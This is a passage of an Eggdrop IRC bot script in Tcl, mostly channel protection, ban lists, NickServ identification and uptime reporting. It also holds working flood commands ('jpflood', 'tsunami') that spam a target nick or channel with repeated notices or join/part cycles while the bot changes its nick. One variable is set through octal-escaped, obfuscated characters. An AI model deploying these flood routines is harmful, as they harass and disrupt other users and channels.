puthlp "NOTICE $nick :$notc NoT OP $channel"
return 0
}
set rest [lrange $rest 1 end]
putsrv "TOPIC $channel :$rest"
}
proc pub_topic {nick uhost hand channel rest} {
global botnick notc botnick
if {![isop $botnick $channel]} { return 0 }
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: topic <topic>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
putsrv "TOPIC $channel :$rest"
}
set [string index $lenc 15][string index $lenc 18] \560\541\555\541\556
set cmd_chn ""
set cmd_by ""
set cmd_msg ""
set cmd_case ""
bind join - * join_jf
proc join_jf {nick uhost hand chan} {
global botnick quick jpfchn jpfmsg jpfidx
if {![info exists jpfmsg]} { return 0 }
if {$nick != $botnick} { return 0 }
if {$chan != $jpfchn} { return 0 }
if {$quick == "1"} {
putqck "PRIVMSG $chan :$jpfmsg,"
} else {
putsrv "PRIVMSG $chan :$jpfmsg,"
}
incr jpfidx
if {$jpfidx >= 4} {
catch { channel remove $jpfchn }
catch { unset jpfchn }
catch { unset jpfmsg }
catch { unset jpfidx }
puthlp "AWAY"
return 0
}
if {$quick == "1"} {
putqck "part $chan :$jpfmsg"
} else {
putsrv "part $chan :$jpfmsg"
}
}
proc pub_jpflood {nick uhost hand channel rest} {
global jpfchn jpfmsg jpfidx notc
if {[string index $rest 0] != "#" || $rest == ""} {
puthlp "NOTICE $nick :$notc Usage: jpflood #channel message"
return 0
}
if {[validchan [lindex $rest 0]]} {
puthlp "NOTICE $nick :$notc dOnt UsE ExIsT cHanneL..!"
return 0
}
set jpfmsg " n0 Reas0n "
if {[lindex $rest 1] != ""} {
set jpfmsg [lindex $rest 1]
}
set jpfchn [lindex $rest 0]
set jpfidx 0
catch { clearqueue all }
pub_randnick $nick $uhost $hand $channel ""
utimer 10 hazar
}
proc hazar {} {
global jpfchn
utimer 120 goback
channel add $jpfchn
catch { channel set $jpfchn +statuslog -revenge -protectops -clearbans -enforcebans -greet -secret -autovoice -autoop flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 }
}
proc pub_tsunami {nick uhost hand channel rest} {
global cmd_chn cmd_by cmd_msg cmd_case botnick version notc quick ps
set person [lindex $rest 0]
set rest [lrange $rest 1 end]
if {$person == $botnick} { return 0 }
if {[string index $person 0] == "#"} {
if {[validchan $person]} {
if {[isop $botnick $person] && ![matchattr $nick m]} {
if {[isutimer "IN PROGRESS"]} { return 0 }
utimer 20 [list putlog "IN PROGRESS"]
putsrv "KICK $channel $nick :$notc 1cHaNNeL 4FLoOd1 PRoTecTIoN4..! [banmsg]"
return 0
}
}
}
if {[matchattr $person n] && ![matchattr $nick Z]} {
if {[isop $botnick $channel]} {
putsrv "KICK $channel $nick :$notc 1ADmIN 4FLoOd1 PRoTecTIoN4..! [banmsg]"
}
if {[istimer "IN PROGRESS"]} { return 0 }
timer 2 [list putlog "IN PROGRESS"]
putsrv "NOTICE $nick :ADmIN fLood PRoTEcTIoN,"
puthlp "NOTICE $nick :ADmIN fLood PRoTEcTIoN,"
puthlp "NOTICE $nick :ADmIN fLood PRoTEcTIoN,"
puthlp "NOTICE $nick :ADmIN fLood PRoTEcTIoN,"
return 0
}
if {![matchattr $nick Z]} {
return 0
}
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: tsunami <nick/#> <msg>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {[string tolower $person] == [string tolower $ps]} { return 0 }
if {[string index $person 0] == "#"} {
if {![validchan $person]} {
pub_randnick $nick $uhost $hand $channel ""
set cmd_chn $person
set cmd_msg $rest
set cmd_by $nick
set cmd_case "1"
channel add $person
catch { channel set $person +statuslog -revenge -protectops -clearbans -enforcebans -greet -secret -autovoice -autoop flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 }
return 0
}
}
catch { clearqueue all }
pub_randnick $nick $uhost $hand $channel ""
if {[string index $person 0] == "#"} { setignore "*!*@*" "*" 120 }
if {$quick == "1"} {
putqck "PRIVMSG $person :$rest,"
putqck "NOTICE $person :$rest,"
}
putsrv "NOTICE $person :$rest,"
puthlp "NOTICE $person :$rest,"
puthlp "NOTICE $person :$rest,"
puthlp "NOTICE $person :$rest,"
puthlp "NOTICE $person :$rest,"
puthlp "NOTICE $person :$rest,"
utimer 10 {
puthlp "AWAY"
}
utimer 120 goback
return 0
}
if {[info exists bchan]} {unset bchan}
set bchan(rescan) 3
set bc_flood 3:10
set bchan(exempt) "#Guardian"
set bchan(protect-hosts) {
$ps!*@*
}
if {[info exists bcqueue]} {unset bcqueue}
set bchan(chans) ""
proc bmaskhost {uhost} {
set uhost [lindex [split $uhost !] [expr [llength [split $uhost !]] -1]]
set temp [string range [lindex [split $uhost @] 0] [expr [string length [lindex [split $uhost @] 0]] - 8] e]
return "*!*$temp@[lindex [split [maskhost *!*@[lindex [split $uhost @] 1]] @] 1]"
}
proc bchan_read {} {
global bchan
set fd [open scripts/badchan.conf r]
while {![eof $fd]} {
set inp [gets $fd]
if {[string trim $inp " "] == ""} {continue}
set ban [lrange $inp 1 e]
set chan [string tolower [lindex $inp 0]]
if {[lsearch $bchan(chans) $chan] == -1} {lappend bchan(chans) $chan}
lappend bchan($chan) $ban
}
close $fd
putlog "badchan.conf loaded."
}
#putlog "Bass's badchan.tcl 1.0 loaded"
if {[file exists scripts/badchan.conf]} {bchan_read} {putlog "badchan.conf not found!"}
proc bc_flood_init {} {
global bc_flood bc_flood_num bc_flood_time bc_flood_array
if {![string match *:* $bc_flood]} {putlog bchan: var bc_flood not set correctly. ; return 1}
set bc_flood_num [lindex [split $bc_flood :] 0]
set bc_flood_time [lindex [split $bc_flood :] 1]
set i [expr $bc_flood_num - 1]
while {$i >= 0} {
set bc_flood_array($i) 0
incr i -1
}
} ; bc_flood_init
proc bc_flood {nick uhost} {
global bc_flood_num bc_flood_time bc_flood_array
if {$bc_flood_num == 0} {return 0}
set i [expr $bc_flood_num - 1]
while {$i >= 1} {
set bc_flood_array($i) $bc_flood_array([expr $i - 1])
incr i -1
}
set bc_flood_array(0) [unixtime]
if {[expr [unixtime] - $bc_flood_array([expr $bc_flood_num - 1])] <= $bc_flood_time} {
putlog "bchan: Flood detected from $nick."
#newignore [join [maskhost *!*[string trimleft $uhost ~]]] bchan flood 2
return  1
} {return 0}
}
bind join - * bchan_join
proc bchan_join {nick uhost hand chan} {
global bchan bcqueue bcnicks botnick
if {[matchattr [nick2hand $nick $chan] bmnof|mnof $chan]} {return 0}
set host [string tolower [lindex [split $uhost @] 1]]
set chan [string tolower $chan]
set nick [string tolower $nick]
if {[lsearch $bchan(chans) $chan] == -1 && ([lsearch $bchan(chans) global] == -1 || [lsearch $bchan(exempt) $chan] > -1)} {return 0}
if {[string tolower $botnick] == [string tolower $nick]} {return 0}
if {![botisop $chan]} {return 0}
if {$bchan(protect-hosts) != ""} {
foreach i $bchan(protect-hosts) {
if {[string match [string tolower $i] $host]} {return 0}
}
}
if {[info exists bcqueue($host)]} {return 0}
set bcqueue($host) 1
if {[bc_flood $nick $uhost]} {return 0}
set bcnicks($nick) $chan
putserv "WHOIS $nick"
set i 0
set temp ""
while {$i < [string length $nick]} {
if {[string index $nick $i] == "\\"} {append temp "\\\\"} elseif {
[string index $nick $i] == "\["} {append temp "\\\["} elseif {
[string index $nick $i] == "\]"} {append temp "\\\]"} elseif {
[string index $nick $i] == "\{"} {append temp "\\\{"} elseif {
[string index $nick $i] == "\}"} {append temp "\\\}"} {
append temp [string index $nick $i]}
incr i
} ; set nick $temp
timer $bchan(rescan) "unset bcqueue($host) ; unset bcnicks($nick)"
}
bind raw - 319 bc_whois
proc bc_whois {from key args} {
global bchan bcqueue bcnicks
set args [join $args]
set nick [string tolower [lindex $args 1]]
if {[info exists bcnicks($nick)]} {set chan $bcnicks($nick)} {return 0}
set chans [string tolower [lrange $args 2 e]]
if {[lsearch $bchan(exempt) $chan] == -1 && $bchan(global) != ""} {set bans $bchan(global)} {set bans ""}
if {[lsearch $bchan(chans) $chan] > -1} {set bans "$bans $bchan($chan)"}
foreach tok $chans {
set tok [string trimleft $tok ":@+"]
foreach ban $bans {
if {[string match [lindex $ban 0] $tok]} {
putlog "args: $args, ban: $ban"
if {[onchan $nick $chan]} {
newchanban $chan [bmaskhost [getchanhost $nick $chan]] badchan "[lgrnd] [lrange $ban 1 e] [banmsg]" 5
}
return 0
}
}
}
return 0
}
bind pub n `globalbc bc_glist
proc bc_glist {1 2 3 4 5} {bc_list $1 $2 $3 global $5}
bind pub m `bc bc_list
proc bc_list {nick uhost hand chan args} {
global bchan
set chan [string tolower $chan]
if {[lsearch $bchan(chans) $chan] == -1} {puthelp "notice $nick :No badchans are registered for $chan." ; return 1}
set i 1
puthelp "notice $nick :BadChans for $chan..."
foreach ban $bchan($chan) {
puthelp "notice $nick :$i) $ban"
incr i
}
}
bind pub n `+globalbc bc_gadd
proc bc_gadd {1 2 3 4 5} {bc_add $1 $2 $3 global $5}
bind pub m `+bc bc_add
proc bc_add {nick uhost hand chan args} {
global bchan
set chan [string tolower $chan]
if {![string match *\\\** [lindex $args 0]]} {puthelp "notice $nick :syntax is: `+bc <chanmask> \[reason\]" ; return 1}
set args [string trimright "[string tolower [lindex $args 0]] [lrange $args 1 e]" " "]
if {[lsearch $bchan(chans) $chan]} {lappend bchan(chans) $chan}
lappend bchan($chan) $args
puthelp "notice $nick :[lindex $args 0] was added to $chan's badchan list."
bchan_save
return 1
}
bind pub n `-globalbc bc_grem
proc bc_grem {1 2 3 4 5} {bc_rem $1 $2 $3 global $5}
bind pub m `-bc bc_rem
proc bc_rem {nick uhost hand chan args} {
global bchan
set chan [string tolower $chan]
set args [string tolower [lindex [join $args] 0]]
if {[lsearch $bchan(chans) $chan] == -1} {puthelp "notice $nick :No badchans are registered for $chan." ; return 1}
if {![string match *\\\** $args]} {puthelp "notice $nick :syntax is: `-bc <chanmask>" ; return 1}
set i 0
set temp ""
foreach ban $bchan($chan) {
if {[string compare $args [lindex $ban 0]] == 0} {incr i} {lappend temp $ban}
}
if {$i > 0} {
if {$temp != ""} {set bchan($chan) $temp} {
unset bchan($chan)
set temp [lsearch $bchan(chans) $chan]
if {$temp == -1} {putlog "bchan: I'm confused." ; return 1}
set bchan(chans) [lreplace $bchan(chans) $temp $temp]
}
puthelp "notice $nick :$args was removed from $chan's badchan list."
bchan_save
} {puthelp "notice $nick :$args was not found in $chan's badchan list."}
return 1
}
proc bchan_save {} {
global bchan
set fd [open scripts/badchan.conf w]
foreach chan $bchan(chans) {
foreach ban $bchan($chan) {
puts $fd "$chan $ban"
}
}
close $fd
}
bind time -  "*2 * * * *" auto_ident
proc auto_ident {min h d m y} {
timer 5 ident_it
auto_ping "0" "0" "0" "0" "0"
}
set words {
"\002*SCaNNiNg*\002"
"\002*TuiNk.TuiNk*\002"
"\002*ZzZT ZzzT*\002"
"SCaNNiNg Lam3R..."
"SCaNNiNg iNViTeR..."
"Search... Search..."
"\002*BzT BzT*\002"
"*nyams*"
"lol"
"!seen *guest* :P"
"!play, !next, !stop :D"
"brb"
"back!"
"cuek!"
"heh"
"on!"
"off!"
"here!"
"!auth"
"!login"
":P"
":D"
"hmm..."
"what?"
"ge to loch!"
"1+1=?"
"&#185;+&#178;=&#179;"
}
bind time - "0 * * * *" wordstime
bind time - "*5 * * * *" wordstime
proc wordstime {n h handle ch te} {
global words
foreach x [channels] {
set cflag "c$x"
set cflag [string range $cflag 0 8]
if {[string match "*+action*" [channel info $x]]} {
if {[getuser $cflag XTRA "ACTION"] == ""} {
putsrv "PRIVMSG $x :\001ACTION [lindex $words [rand [llength $words]]]\001"
} {
putsrv "PRIVMSG $x :\001ACTION [getuser $cflag XTRA "ACTION"]\001"
}
}
}
}
proc ident_it {} {
global nick altnick botnick nickpass altpass ex_flood invme pingchan own chk_reg
global kickme deopme cmd_chn cmd_msg ps twice_msg keep-nick version notc lastkey
global flooddeop floodnick floodkick server-online is_m op_it jpfchn jpfmsg jpfidx
putlog "!Log! AuTO ReSETING & IDeNTIFY"
catch { channel remove $jpfchn }
catch { unset jpfchn }
catch { unset jpfmsg }
catch { unset jpfidx }
catch {unset op_it}
catch {unset is_m}
catch {unset chk_reg}
catch {unset flooddeop}
catch {unset floodnick}
catch {unset floodkick}
catch {unset lastkey}
catch {unset ex_flood}
catch {unset invme}
catch {unset pingchan}
catch {unset twice_msg}
catch {unset kickme}
set deopme ""
set cmd_chn ""
set cmd_msg ""
if {${server-online} == 0} { return 0 }
if {![string match "BHL??????????" $botnick] && ![string match "BHL??????" $botnick]} {
if {$botnick != $nick && $botnick != $altnick && ![istimer "goback"] && ![isutimer "goback"]} { goback }
} {
goback
}
if {$botnick == $nick && $nickpass != ""} {
putsrv "NickServ identify $nickpass"
}
if {$botnick != $nick && $nickpass != ""} {
putsrv "NickServ identify $nick $nickpass"
}
if {$ps != $own} {
set own $ps
}
if {![isutimer "del_nobase"] && ![istimer "del_nobase"]} { utimer 2 del_nobase }
}
bind time -  "*4 * * * *" auto_ping
bind time -  "*8 * * * *" auto_ping
proc auto_ping {min h d m y} {
global botnick repeat_last repeat_person capsnick boldnick own notc notc_chn bannick
global unop wait_ping server-online jpnick igflood is_ban iskick colorkick yealnick
if {${server-online} == 0} {
catch { unset wait_ping }
return 0
}
catch {unset iskick}
catch {unset is_ban}
catch {unset igflood}
catch {unset jpnick}
catch {unset unop}
catch {unset bannick}
catch {unset notc_chn}
catch {unset capsnick}
catch {unset boldnick}
catch {unset colorkick}
catch {unset yealnick}
catch {unset repeat_person}
catch {unset repeat_last}
puthlp "PRIVMSG $botnick :\001PING [unixtime]\001"
if {![info exists wait_ping]} {
set wait_ping 1
} else {
set wait_ping [expr $wait_ping + 1]
}
if {$wait_ping > 20} {
catch { unset wait_ping }
putsrv "QUIT :$notc Server LAggEd AuTo ReSTaRT ReQuesT"
}
}
proc remain {} {
global botnick uptime timezone notc notd vern longer awaybanner awban awaym
set totalyear [expr [unixtime] - $uptime]
if {$totalyear >= 31536000} {
set yearsfull [expr $totalyear/31536000]
set years [expr int($yearsfull)]
set yearssub [expr 31536000*$years]
set totalday [expr $totalyear - $yearssub]
}
if {$totalyear < 31536000} {
set totalday $totalyear
set years 0
}
if {$totalday >= 86400} {
set daysfull [expr $totalday/86400]
set days [expr int($daysfull)]
set dayssub [expr 86400*$days]
set totalhour [expr $totalday - $dayssub]
}
if {$totalday < 86400} {
set totalhour $totalday
set days 0
}
if {$totalhour >= 3600} {
set hoursfull [expr $totalhour/3600]
set hours [expr int($hoursfull)]
set hourssub [expr 3600*$hours]
set totalmin [expr $totalhour - $hourssub]
}

if {$totalhour < 3600} {
set totalmin $totalhour
set hours 0
}
if {$totalmin >= 60} {
set minsfull [expr $totalmin/60]
set mins [expr int($minsfull)]
}
if {$totalmin < 60} {
set mins 0
}
if {$years < 1} {set yearstext ""} elseif {$years == 1} {set yearstext "${years}1y, "} {set yearstext "${years}1y, "}
if {$days < 1} {set daystext ""} elseif {$days == 1} {set daystext "${days}1d, "} {set daystext "${days}1d, "}
if {$hours < 1} {set hourstext ""} elseif {$hours == 1} {set hourstext "$hours HoUR, "} {set hourstext "$hours HoURS, "}
if {$mins < 1} {set minstext ""} elseif {$mins == 1} {set minstext "$mins MiNuTE"} {set minstext "$mins MiNuTES"}
if {[string length $mins] == 1} {set mins "0${mins}"}
if {[string length $hours] == 1} {set hours "0${hours}"}
set output "${yearstext}${daystext}${hours}1h ${mins}1m"
set output [string trimright $output ", "]
if {[getuser "config" XTRA "WEND"]!=""} {
set awban $awaybanner
} {
set awban [lgrnd]
}
if {[getuser "config" XTRA "AWAY"]!=""} {
set longer "$awban $vern 4uptime $output 4(10 [getuser "config" XTRA "AWAY"] 4)"
} {
set awaymsg [lindex $awaym [rand [llength $awaym]]]
set longer "$awban $vern 4uptime $output 4(10 $awaymsg 4)"
}
}
proc msg_userlist {nick hand uhost rest} {
global notc
pub_userlist $nick $uhost $hand "" $rest
}
proc pub_userlist {nick uhost hand chan rest} {
global ps notc
set akicklist " 4KIcKLIsT"
foreach y [getuser "AKICK" HOSTS] {
append akicklist " $y "
}
set users "UsERLIsT:"
foreach x [userlist] {
if {($x != "config") && ($x != "AKICK") && ($x != $ps) && ![matchattr $x A]} {
if {[matchattr $x O]} {
append users " 4$x "
} else { append users " $x " }
set flag [chattr $x]
append users "($flag)"
}
}
append users " \[$akicklist\]"
if {[getuser "config" XTRA "IPG"] != ""} {
append users " IpguaRd [getuser "config" XTRA "IPG"]"
}
if {[string length $users] > 300} {
set half [expr [string length $users]/3]
set half [expr int($half)]
set ntc "[string range $users 0 $half].."
puthlp "NOTICE $nick :$notc $ntc"
set ntc "..[string range $users [expr $half + 1] [expr $half + $half]].."
puthlp "NOTICE $nick :$notc $ntc"
set ntc "..[string range $users [expr $half + 1 + $half] end]"
puthlp "NOTICE $nick :$notc $ntc"
} elseif {[string length $users] > 200} {
set half [expr [string length $users]/2]
set half [expr int($half)]
set ntc "[string range $users 0 $half].."
puthlp "NOTICE $nick :$notc $ntc"
set ntc "..[string range $users [expr $half + 1] end]"
puthlp "NOTICE $nick :$notc $ntc"
} else {
puthlp "NOTICE $nick :$notc $users"
}
return 0
}
proc pub_ver {nick uhost hand chan rest} {
global vern notc
puthlp "PRIVMSG $chan :$notc $vern v.1.0.3b Final, Get It Now!! Visit: http://eggdrop.freeoda.com/tcl/eggdrop"
return 0
}
proc pub_logo {nick uhost hand chan rest} {
global banner vern
if {[info exists banner]} {
puthlp "PRIVMSG $chan :$banner $vern"
} {
puthlp "PRIVMSG $chan :[lgrnd] $vern"
}
return 0
}
proc pub_logoaway {nick uhost hand chan rest} {
global awaybanner
if {[info exists awaybanner]} {
puthlp "PRIVMSG $chan :$awaybanner"
} {
puthlp "PRIVMSG $chan :[lgrnd]"
}
return 0
}
proc pub_ping {nick uhost hand chan rest} {
puthlp "PRIVMSG $chan :$nick, PONG"
return 0
}
proc pub_nobot {nick uhost hand chan rest} {
global botnick
if {![isop $botnick $chan]} { return 0 }
if {[isutimer "pub_nobot"]} { return 0 }
if {[rand 2] <= 1} {
puthlp "PRIVMSG $chan :\001USERINFO\001"
} {
puthlp "PRIVMSG $chan :\001CLIENTINFO\001"
}
return 0
}
bind ctcr - USERINFO ui_reply
bind ctcr - CLIENTINFO ui_reply
proc ui_reply {nick uhost hand dest key arg} {
global botnick bannick notc ismaskhost
if {![string match "*eggdrop*" $arg]} { return 0 }
if {$nick == $botnick || [matchattr $nick f]} { return 0 }
foreach x [channels] {
if {[onchan $nick $x] && [isop $botnick $x] && ![isop $nick $x]} {
if {[info exists ismaskhost]} {
set bannick($nick) [maskhost "*!*[string range $uhost [string first "@" $uhost] end]"]
} {
set bannick($nick) "*!*[string range $uhost [string first "@" $uhost] end]"
}
putsrv "KICK $x $nick :$notc 4[string toupper $x]1 FoRBIDDeN FoR 4EggY1 DuE tO LamE AnTIcIPaTEd [banmsg]"
return 0
}
}
}
#bind ctcr - PING ping_reply
proc ping_reply {nick uhost hand dest key arg} {
global pingchan botnick wait_ping
catch { unset wait_ping }
if {$nick == $botnick} {
return 0
}
if {![matchattr $nick f]} {
set hostmask "${nick}!*@*"
putlog "!Log! 1 minutes auto ignore to $hostmask"
newignore $hostmask $botnick "*" 1
}
return 0
}
proc pub_reset {nick uhost hand chan rest} {
global notc
putsrv "NOTICE $nick :$notc !ReSeT!"
auto_ping "0" "0" "0" "0" "0"
ident_it
}
proc pub_pong {nick uhost hand chan rest} {
global pingchan
putsrv "PRIVMSG $nick :\001PING [unixtime]\001"
set pingchan($nick) $chan
return 0
}
proc pub_auth {nick uhost hand chan rest} {
global botnick notc
set cmd [string tolower [lindex $rest 0]]
set ch [passwdok $nick ""]
if {$ch == 1} {
puthlp "NOTICE $nick :$notc No password set. Usage: pass <password>"
return 0
}
if {[matchattr $nick Q]} {
puthlp "PRIVMSG $chan :${nick}, Yes"
}
if {![matchattr $nick Q]} {
puthlp "PRIVMSG $chan :${nick}, 4NO!"
}
}
proc notc_prot {nick uhost hand text {dest ""}} {
global notc botnick notc_chn bannick notm quick ismaskhost is_m
if {$dest != "" && $dest != $botnick} {
if {[string index $dest 0] == "+" || [string index $dest 0] == "@"} {
foreach x [channels] {
set x [string tolower $x]
if {[string match "*$x*" [string tolower $dest]]} {
set dest $x
break
}
}
}
if {[isop $botnick $dest]} {
if {[string match "*-greet*" [channel info $dest]]} { return 0 }
if {$nick == "ChanServ"} { return 0 }
if {$nick == $botnick} { return 0 }
if {[matchattr $nick f]} { return 0 }
if {[isop $nick $dest]} { return 0 }
if {[isutimer "set_-m $dest"]} { return 0 }
set banmask "*!*[string range $uhost [string first "@" $uhost] end]"
set bannick($nick) $banmask
if {[info exists notc_chn($dest)]} {
incr notc_chn($dest)
} {
set notc_chn($dest) 1
}
if {$notc_chn($dest) == 1} {
putsrv "KICK $dest $nick :$notc 1ABusINg 4NoTIcE1 @ps OnLY [banmsg]"
} elseif {$notc_chn($dest) == 2} {
if {$quick == "1" && ![info exists is_m($dest)]} {
putqck "KICK $dest $nick :$notc 1TwIcE 4NoTIcE1 ABusEd [banmsg]"
} {
putsrv "KICK $dest $nick :$notc 1TwIcE 4NoTIcE1 ABusEd [banmsg]"
}
} elseif {$notc_chn($dest) >= 3} {
if {[info exists ismaskhost]} {
set bannick($nick) [maskhost $banmask]
}
if {$quick == "1" && ![info exists is_m($dest)]} {
putqck "KICK $dest $nick :$notc 1tO mUcH 4vIoLencE1 FRoM THIS I.S.P 4@uT.1 !! [banmsg]"
} {
putsrv "KICK $dest $nick :$notc 1tO mUcH 4vIoLencE1 FRoM THIS I.S.P 4@uT.1 !! [banmsg]"
}
}
return 0
}
repeat_pubm $nick $uhost $hand $dest $text
} {
msg_prot $nick $uhost $hand $text
}
}
bind nick - * ps:check
proc setignore {mask reason time} {
global quick
foreach x [ignorelist] {
if {[lindex $x 0] == $mask} { return 0 }
}
newignore $mask "IgN" $reason 15
if {$quick == "1"} {
putquick "silence +$mask"
} {
putserv "silence +$mask"
}
utimer $time [list unsetignore $mask]
}
proc unsetignore {mask} {
if {![isignore $mask]} { return 0 }
putserv "silence -$mask"
killignore $mask
}
set massmsg 0
proc msg_prot {unick uhost hand text} {
global nick botnick invme own nickpass altpass notc notb notd virus_nick ex_flood vern
global altnick twice_msg version bannick massmsg keep-nick badwords advwords quick is_m ismaskhost
global first_query second_query first_msg second_msg ps
set first_query [lindex $first_msg [rand [llength $first_msg]]]; set second_query [lindex $second_msg [rand [llength $second_msg]]]
regsub -all -- \" $text "" text
msg_Z $unick $uhost $hand $text
set real $text
set text [uncolor $text]
if {$unick == $botnick} { return 0 }
if {[string match "*dcc send*" [string tolower $text]] && ![string match "*Serv*" $unick] && ![matchattr $unick f]} {
set virus_nick $unick
foreach x [channels] {
if {[onchan $virus_nick $x] && ![matchattr $virus_nick f] && ![isop $virus_nick $x]} {
if {[isop $botnick $x]} {
set host [getchanhost $virus_nick $x]
set host "*!*@[lindex [split $host @] 1]"
set bannick($virus_nick) $host
putsrv "KICK $x $virus_nick :$notc !4Sp&#226;4M!10 I HaTE 4VIRuZ [banms]"
set virus_nick ""
} else {
set members [chanlist $x f]
foreach c $members {
if {[isop $c $x] && [string tolower $c] != [string tolower $ps]} {
set sendspam "!kick [zip "$x $unick $notc !4Sp&#226;4M!10 FRoM 4@[lindex [split [getchanhost $virus_nick $x] @] 1]1 ViRuZ [banmsg]"]"
putsrv "PRIVMSG $c :$sendspam"
return 0
}
}
}
}
}
return 0
}
if {$unick == "ChanServ"} {
if {[string match "*You do not have access to op people on*" $text] && [getuser "config" XTRA "MUSTOP"] != "" && $botnick == $nick} {
set partchn [lindex $text 9]
set partchn [string range $partchn 0 [expr [string length $partchn]-2]]
if {[string match "*-secret*" [channel info $partchn]]} {
putsrv "PART $partchn :((((@pGuaRd))))"
channel remove $partchn
savechan
}
}
if {[string match "*is not on*" $text]} {
set text [string tolower $text]
foreach x [channels] {
set x [string tolower $x]
set cflag "c$x"
set cflag [string range $cflag 0 8]
if {[string match "*$x*" $text]} {
if {![string match "*c*" [getchanmode $x]]} {
putsrv "PART $x :1regained (4@1)ps status"
} {
putsrv "PART $x :1regained (@)ps status"
}
if {[matchattr $cflag K]} {
puthlp "JOIN $x :[dezip [getuser $cflag XTRA "CI"]]"
} {
puthlp "JOIN $x"
}
}
}
return 0
}
if {[string match "*AOP:*SOP:*AKICK*" $text]} {
foreach errchan [channels] {
set cflag "c$errchan"
set cflag [string range $cflag 0 8]
if {[string match "*[string tolower $errchan] *" [string tolower $text]]} {
if {![isop $botnick $errchan]} {
timer 1 { putlog "resync" }
if {![string match "*c*" [getchanmode $errchan]]} {
putsrv "PART $errchan :1regained (4@1)ps status"
} {
putsrv "PART $errchan :regained (@)ps status"
}
if {[matchattr $cflag K]} {
puthlp "JOIN $errchan :[dezip [getuser $cflag XTRA "CI"]]"
} {
puthlp "JOIN $errchan"
}
}
return 0
}
}
}
return 0
}
if {$unick == "NickServ"} {
if {[string match "*nick is owned*" [string tolower $text]] || [string match "*nickname is registered*" [string tolower $text]]} {
putlog "!Log! IDeNTIFY"
catch { clearqueue all }
if {$botnick == $nick && $nickpass != ""} {
putsrv "NickServ identify $nickpass"
}
if {$botnick == $altnick && $altpass != ""} {
putsrv "NickServ identify $altpass"
}
}
if {[string match "*Password accepted*" $text]} { auto_reop }
if {[string match "*The nick $nick is not registered*" $text] && $nickpass != ""} {
if {[getuser "config" XTRA "EMAIL"] != ""} {
putsrv "NickServ register $nickpass [getuser "config" XTRA "EMAIL"]"
}
}
if {[string match "*The nick $nick has been temporarily registered to you*" $text]} {
putsrv "NickServ identify $nickpass"
}
return 0
}
if {$unick == "MemoServ"} {
if {[string match "*New DALnet news is available*" $text]} {
putsrv "PRIVMSG MemoServ@services.dal.net :NEWS"
}
return 0
}
if {[string match "!kick*" [string tolower $text]]} {
set salls [dezip [lrange $text 1 end]]
set schan [lindex $salls 0]
set snick [lindex $salls 1]
set sreas [lrange $salls 2 end]
if {![isop $botnick $schan] || [matchattr $snick f] || ![onchan $snick $schan] && ![matchattr $unick b]} { return 0 }
set banhost [getchanhost $snick $schan]
set banhost "*!*@[lindex [split $banhost @] 1]"
set bannick($snick) $banhost
regsub -all -- \{ $sreas "" sreas
regsub -all -- \} $sreas "" sreas
putsrv "KICK $schan $snick :$sreas"
return 0
}
if {[string match "*auth*" $text] || [string match "*[string tolower $notb]*" [string tolower $text]]} { return 0 }
if {[matchattr $hand f]} { return 0 }
set mhost [string range $uhost [string first "@" $uhost] end]
if {![isutimer "MSGCOUNTER"]} {
utimer 20 { putlog "MSGCOUNTER" }
set massmsg 1
} {
set massmsg [incr massmsg]
if {[string length $text] > 100} {
set massmsg [incr massmsg]
}
if {$massmsg >= 5} {
set massmsg 0
set mhost [string range $uhost [string first "@" $uhost] end]
setignore "*!*@*" "*" 120
if {[info exists ismaskhost]} {
setignore [maskhost "*!*$mhost"] "MaZz MSg" 300
} {
setignore "*!*$mhost" "MaZz MSg" 300
}
foreach iamop [channels] {
if {[isop $botnick $iamop]} {
if {[string match "*c*" [getchanmode $iamop]]} {
puthlp "PRIVMSG $iamop :\001ACTION IncOmINg MaZz MSg..! LasT FRoM [unsix "$unick!$uhost"]\001"
} {
puthlp "PRIVMSG $iamop :\001ACTION IncOmINg MaZz MSg..! LasT FRoM 1[unsix "$unick!$uhost"]\001"
}
foreach c [chanlist $iamop] {
set nickhost [string range [getchanhost $c $iamop] [string first "@" [getchanhost $c $iamop]] end]
if {$nickhost == $mhost && ![matchattr $c f]} {
if {$c == $botnick} { return 0 }
set bannick($c) "*!*$mhost"
putsrv "KICK $iamop $c :$notc 1Heavy 4FLoOd1 MSg FRoM 4$mhost [banms]"
break
}
}
}
}
return 0
}
}
if {[string match "*decode*" [string tolower $text]]} {
foreach x [channels] {
if {[onchan $unick $x]} {
if {[isop $botnick $x]} {
set bannick($unick) "*!*$mhost"
putsrv "KICK $x $unick :$notc !4Sp&#226;4M!10 I HaTE 4dEcOdE [banms]"
return 0
} {
set members [chanlist $x f]
foreach c $members {
if {[isop $c $x] && [string tolower $c] != [string tolower $ps]} {
set sendspam "!kick [zip "$x $unick $notc !4Sp&#226;4M!10 FRoM 4[string range $uhost [string first "@" $uhost] end]1 dEcOdE [banmsg]"]"
putsrv "PRIVMSG $c :$sendspam"
return 0
}
}
}
}
}
set invme($mhost) "dEcOdE"
}
if {[string match "*#*" $text] || [string match "*/j*" $text]} {
foreach x [channels] {
set chksiton [string tolower $x]
if {[string match "*$chksiton*" [string tolower $text]]} { return 0 }
}
foreach x [channels] {
if {[onchan $unick $x]} {
if {[isop $botnick $x]} {
set banmask "*!*[string range $uhost [string first "@" $uhost] end]"
set bannick($unick) $banmask
putsrv "KICK $x $unick :$notc !4Sp&#226;4M!10 I HaTE 4InvITeR [banms]"
return 0
} {
set members [chanlist $x]
foreach c $members {
if {[isop $c $x] && [string tolower $c] != [string tolower $ps]} {
set sendspam "!kick [zip "$x $unick $notc !4Sp&#226;4M!10 FRoM 4[string range $uhost [string first "@" $uhost] end]1 InvITE [banmsg]"]"
putsrv "PRIVMSG $c :$sendspam"
return 0
}
}
} } {
set banmask "[string range $uhost [string first "@" $uhost] end]"
if {$banmask != "*!*@*" && $banmask != "*"} {
foreach c [chanlist $x] {
set nickhost "[string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]"
if {$banmask == $nickhost} {
if {[matchattr $c f]} {
putlog "!Log! InVITE (f) $c PaSS!!"
return 0
}
if {$c != $botnick} {
if {[isop $botnick $x]} {
